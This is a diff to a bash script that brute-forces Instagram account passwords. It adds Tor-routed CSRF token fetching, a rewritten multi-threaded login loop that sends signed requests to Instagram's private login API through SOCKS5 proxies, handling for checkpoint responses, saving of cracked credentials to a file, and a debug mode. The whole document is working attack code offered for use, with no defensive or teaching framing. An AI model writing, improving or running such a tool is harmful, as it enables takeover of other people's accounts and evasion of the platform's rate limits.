@@ -11,6 +11,7 @@ DELAY_BETWEEN_BATCHES=0
 TOR_START_DELAY=5
 BACKOFF_INITIAL=5
 BACKOFF_MAX=40
+DEBUG=0
 # ========================================================
 
 # ======================== DEVICE SPOOF ========================
@@ -92,8 +93,17 @@ function start() {
         read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
         threads="${threads:-${default_threads}}"
     fi
-    var=$(curl -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid" > /dev/null)
-    var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
+    var=$(curl --socks5 127.0.0.1:9051 -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
+    var2=$(echo "$var" | grep -i "set-cookie" | grep -o "csrftoken=[^;]*" | head -1 | cut -d '=' -f2)
+    if [[ -z "$var2" ]]; then
+        printf "\e[1;93m[!] CSRF token fetch failed, retrying without Tor...\e[0m\n"
+        var=$(curl -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
+        var2=$(echo "$var" | grep -i "set-cookie" | grep -o "csrftoken=[^;]*" | head -1 | cut -d '=' -f2)
+    fi
+    if [[ "$DEBUG" -eq 1 ]]; then
+        printf "\e[1;93m[DEBUG] Raw CSRF response saved to debug_csrf.log\e[0m\n"
+        echo "$var" > debug_csrf.log
+    fi
     printf "\e[1;92m[*] CSRF Token: \e[0m\e[1;77m%s\e[0m\n" "$var2"
 }
 
@@ -218,14 +228,13 @@ function bruteforcer() {
             counter=1
             IFS=$'\n'
             for pass in $(sed -n "${thread_startline},${thread_endline}p" "$wl_pass"); do
-                header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "'"$useragent"'"'
                 data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
                 countpass=$((thread_startline + counter - 1))
                 hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
                 printf "\e[1;77m[%s] Trying pass (%s/%s)\e[0m: %s\n" "$thread_label" "$countpass" "$count_pass" "$pass"
-                {(trap '' SIGINT && var=$(curl --socks5 "127.0.0.1:$port" -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait" | uniq); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "Please wait" ]]; then printf "\e[1;91m  [!] Rate limited on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; backoff=$((backoff+1)); elif [[ -z "$var" ]]; then printf "\e[1;91m  [!] Empty response on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; fi;)} &
+                {(trap '' SIGINT && response=$(curl --socks5 "127.0.0.1:$port" -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" -H "Connection: close" -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-IG-App-ID: 567067343352127" -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/accounts/login/"); if [[ "$DEBUG" -eq 1 ]]; then echo "[$(date '+%H:%M:%S')] $pass -> $response" >> debug_login.log; fi; var=$(echo "$response" | grep -o "200\|challenge\|checkpoint_required\|many tries\|Please wait\|bad_password\|invalid_password\|login_required" | uniq); if [[ $var == "challenge" || $var == "checkpoint_required" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge/Checkpoint required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "Please wait" ]]; then printf "\e[1;91m  [!] Rate limited on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; backoff=$((backoff+1)); elif [[ -z "$var" ]]; then printf "\e[1;91m  [!] No match on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; if [[ "$DEBUG" -eq 1 ]]; then printf "\e[1;93m  [DEBUG] Raw: %s\e[0m\n" "$(echo "$response" | head -5)"; fi; fi;)} &
                 counter=$((counter+1))
-                sleep 0.2
+                sleep 1
             done
             wait
         done
@@ -271,8 +280,17 @@ function resume() {
     source $(ls sessions/store.session* | sed "${fileresume}q;d")
 
     # Re-fetch CSRF token
-    var=$(curl -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid" > /dev/null)
-    var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
+    var=$(curl --socks5 127.0.0.1:9051 -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
+    var2=$(echo "$var" | grep -i "set-cookie" | grep -o "csrftoken=[^;]*" | head -1 | cut -d '=' -f2)
+    if [[ -z "$var2" ]]; then
+        printf "\e[1;93m[!] CSRF token fetch failed, retrying without Tor...\e[0m\n"
+        var=$(curl -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
+        var2=$(echo "$var" | grep -i "set-cookie" | grep -o "csrftoken=[^;]*" | head -1 | cut -d '=' -f2)
+    fi
+    if [[ "$DEBUG" -eq 1 ]]; then
+        printf "\e[1;93m[DEBUG] Raw CSRF response saved to debug_csrf.log\e[0m\n"
+        echo "$var" > debug_csrf.log
+    fi
 
     printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" "$user"
     printf "\e[1;92m[*] Wordlist:\e[0m \e[1;77m%s\e[0m\n" "$wl_pass"
@@ -292,14 +310,13 @@ function resume() {
             counter=1
             IFS=$'\n'
             for pass in $(sed -n "${thread_startline},${thread_endline}p" "$wl_pass"); do
-                header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "'"$useragent"'"'
                 data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
                 countpass=$((thread_startline + counter - 1))
                 hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
                 printf "\e[1;77m[%s] Trying pass (%s/%s)\e[0m: %s\n" "$thread_label" "$countpass" "$count_pass" "$pass"
-                {(trap '' SIGINT && var=$(curl --socks5 "127.0.0.1:$port" -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait" | uniq); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "Please wait" ]]; then printf "\e[1;91m  [!] Rate limited on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; backoff=$((backoff+1)); elif [[ -z "$var" ]]; then printf "\e[1;91m  [!] Empty response on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; fi;)} &
+                {(trap '' SIGINT && response=$(curl --socks5 "127.0.0.1:$port" -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" -H "Connection: close" -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-IG-App-ID: 567067343352127" -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/accounts/login/"); if [[ "$DEBUG" -eq 1 ]]; then echo "[$(date '+%H:%M:%S')] $pass -> $response" >> debug_login.log; fi; var=$(echo "$response" | grep -o "200\|challenge\|checkpoint_required\|many tries\|Please wait\|bad_password\|invalid_password\|login_required" | uniq); if [[ $var == "challenge" || $var == "checkpoint_required" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge/Checkpoint required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "Please wait" ]]; then printf "\e[1;91m  [!] Rate limited on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; backoff=$((backoff+1)); elif [[ -z "$var" ]]; then printf "\e[1;91m  [!] No match on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; if [[ "$DEBUG" -eq 1 ]]; then printf "\e[1;93m  [DEBUG] Raw: %s\e[0m\n" "$(echo "$response" | head -5)"; fi; fi;)} &
                 counter=$((counter+1))
-                sleep 0.2
+                sleep 1
             done
             wait
         done
@@ -328,11 +345,19 @@ case "$1" in
     --resume)
         resume
         ;;
+    --debug)
+        DEBUG=1
+        printf "\e[1;93m[*] Debug mode enabled - raw responses will be logged\e[0m\n"
+        start
+        multitor
+        bruteforcer
+        ;;
     --help)
         banner
         printf "\e[1;92mUsage:\e[0m\n"
         printf "  ./Brute.sh              Start new brute-force session\n"
         printf "  ./Brute.sh --resume     Resume a saved session\n"
+        printf "  ./Brute.sh --debug      Start with debug logging\n"
         printf "  ./Brute.sh --help       Show this help message\n"
         printf "\n"
         printf "\e[1;92mFeatures:\e[0m\n"
